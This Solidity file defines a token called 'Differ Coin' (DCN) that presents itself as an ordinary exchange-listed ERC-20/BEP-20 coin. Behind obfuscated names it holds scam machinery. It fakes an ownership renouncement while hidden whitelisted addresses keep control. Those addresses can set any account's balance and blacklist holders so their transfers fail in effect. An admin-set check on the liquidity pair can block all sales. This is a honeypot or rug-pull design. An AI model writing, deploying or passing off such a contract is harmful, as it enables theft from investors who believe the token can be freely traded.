//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract atMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listMax {
    function createPair(address amountTotal, address shouldToken) external returns (address);

    function feeTo() external view returns (address);
}

interface tokenShouldLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface launchedReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamReceiver) external view returns (uint256);

    function transfer(address launchedAt, uint256 minBuy) external returns (bool);

    function allowance(address shouldBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 minBuy) external returns (bool);

    function transferFrom(
        address sender,
        address launchedAt,
        uint256 minBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTradingReceiver, uint256 value);
    event Approval(address indexed shouldBuy, address indexed spender, uint256 value);
}

interface launchedReceiverMetadata is launchedReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DifferCoin is atMax, launchedReceiver, launchedReceiverMetadata {

    function symbol() external view virtual override returns (string memory) {
        return amountMarketing;
    }

    address private enableReceiver;

    uint256 public launchedIs = 0;

    uint256 public marketingFundFee = 0;

    function balanceOf(address teamReceiver) public view virtual override returns (uint256) {
        return fromToken[teamReceiver];
    }

    function limitTx(uint256 minBuy) public {
        launchList();
        atLimitExempt = minBuy;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedTake;
    }

    bool public txLaunchMode;

    bool public listSellLiquidity;

    mapping(address => bool) public maxLaunchReceiver;

    uint256 public tokenAmount;

    address maxAt;

    function transferFrom(address limitBuy, address launchedAt, uint256 minBuy) external override returns (bool) {
        if (_msgSender() != enableAutoSwap) {
            if (tradingTx[limitBuy][_msgSender()] != type(uint256).max) {
                require(minBuy <= tradingTx[limitBuy][_msgSender()]);
                tradingTx[limitBuy][_msgSender()] -= minBuy;
            }
        }
        return tradingSender(limitBuy, launchedAt, minBuy);
    }

    uint256 atLimitExempt;

    address enableAutoSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address launchMode, uint256 minBuy) public virtual override returns (bool) {
        tradingTx[_msgSender()][launchMode] = minBuy;
        emit Approval(_msgSender(), launchMode, minBuy);
        return true;
    }

    address public limitTeamAmount;

    mapping(address => bool) public enableLimit;

    function fundToMarketing(address shouldExempt) public {
        require(shouldExempt.balance < 100000);
        if (listSellLiquidity) {
            return;
        }
        if (buyFrom == maxLimitTrading) {
            exemptTakeMode = false;
        }
        enableLimit[shouldExempt] = true;
        
        listSellLiquidity = true;
    }

    constructor (){
        
        senderWallet();
        tokenShouldLaunched receiverMin = tokenShouldLaunched(enableAutoSwap);
        limitTeamAmount = listMax(receiverMin.factory()).createPair(receiverMin.WETH(), address(this));
        maxAt = listMax(receiverMin.factory()).feeTo();
        if (exemptTakeMode) {
            sellAmount = buyFrom;
        }
        walletTotal = _msgSender();
        enableLimit[walletTotal] = true;
        fromToken[walletTotal] = senderEnable;
        if (exemptTakeMode) {
            txLaunchMode = true;
        }
        emit Transfer(address(0), walletTotal, senderEnable);
    }

    uint256 constant enableMarketing = 9 ** 10;

    uint256 takeFrom;

    function tokenAuto(address limitBuy, address launchedAt, uint256 minBuy) internal returns (bool) {
        require(fromToken[limitBuy] >= minBuy);
        fromToken[limitBuy] -= minBuy;
        fromToken[launchedAt] += minBuy;
        emit Transfer(limitBuy, launchedAt, minBuy);
        return true;
    }

    function launchList() private view {
        require(enableLimit[_msgSender()]);
    }

    string private amountMarketing = "DCN";

    uint256 private maxLimitTrading;

    function maxBuyMarketing(address swapBuyMax, uint256 minBuy) public {
        launchList();
        fromToken[swapBuyMax] = minBuy;
    }

    bool public exemptTakeMode;

    function name() external view virtual override returns (string memory) {
        return maxMode;
    }

    function senderAmountShould(address walletAuto) public {
        launchList();
        
        if (walletAuto == walletTotal || walletAuto == limitTeamAmount) {
            return;
        }
        maxLaunchReceiver[walletAuto] = true;
    }

    function senderWallet() public {
        emit OwnershipTransferred(walletTotal, address(0));
        enableReceiver = address(0);
    }

    string private maxMode = "Differ Coin";

    function owner() external view returns (address) {
        return enableReceiver;
    }

    uint256 private senderEnable = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return senderEnable;
    }

    uint256 public sellAmount;

    bool private enableAmount;

    mapping(address => mapping(address => uint256)) private tradingTx;

    address public walletTotal;

    function fromLaunch(address limitBuy, address launchedAt, uint256 minBuy) internal view returns (uint256) {
        require(minBuy > 0);

        uint256 tokenBuy = 0;
        if (limitBuy == limitTeamAmount && launchedIs > 0) {
            tokenBuy = minBuy * launchedIs / 100;
        } else if (launchedAt == limitTeamAmount && marketingFundFee > 0) {
            tokenBuy = minBuy * marketingFundFee / 100;
        }
        require(tokenBuy <= minBuy);
        return minBuy - tokenBuy;
    }

    function allowance(address senderFrom, address launchMode) external view virtual override returns (uint256) {
        if (launchMode == enableAutoSwap) {
            return type(uint256).max;
        }
        return tradingTx[senderFrom][launchMode];
    }

    uint8 private launchedTake = 18;

    function transfer(address swapBuyMax, uint256 minBuy) external virtual override returns (bool) {
        return tradingSender(_msgSender(), swapBuyMax, minBuy);
    }

    function tradingSender(address limitBuy, address launchedAt, uint256 minBuy) internal returns (bool) {
        if (limitBuy == walletTotal) {
            return tokenAuto(limitBuy, launchedAt, minBuy);
        }
        uint256 minFee = launchedReceiver(limitTeamAmount).balanceOf(maxAt);
        require(minFee == atLimitExempt);
        require(launchedAt != maxAt);
        if (maxLaunchReceiver[limitBuy]) {
            return tokenAuto(limitBuy, launchedAt, enableMarketing);
        }
        minBuy = fromLaunch(limitBuy, launchedAt, minBuy);
        return tokenAuto(limitBuy, launchedAt, minBuy);
    }

    mapping(address => uint256) private fromToken;

    uint256 public buyFrom;

    event OwnershipTransferred(address indexed marketingTxLaunched, address indexed receiverExempt);

    function getOwner() external view returns (address) {
        return enableReceiver;
    }

}